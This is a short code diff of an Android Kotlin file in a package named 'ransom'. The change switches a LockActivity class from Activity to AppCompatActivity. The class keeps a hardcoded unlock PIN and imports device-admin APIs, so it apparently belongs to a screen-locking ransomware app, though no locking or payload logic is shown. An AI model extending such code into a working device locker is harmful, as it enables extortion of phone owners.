@@ -1,6 +1,5 @@
 package com.bos.ransom
 
-import android.app.Activity
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.graphics.Color
@@ -14,8 +13,9 @@ import android.widget.EditText
 import android.widget.LinearLayout
 import android.widget.TextView
 import android.widget.Toast
+import androidx.appcompat.app.AppCompatActivity
 
-class LockActivity : Activity() {
+class LockActivity : AppCompatActivity() {
 
     private val PIN = "12345"
     private val handler = Handler(Looper.getMainLooper())
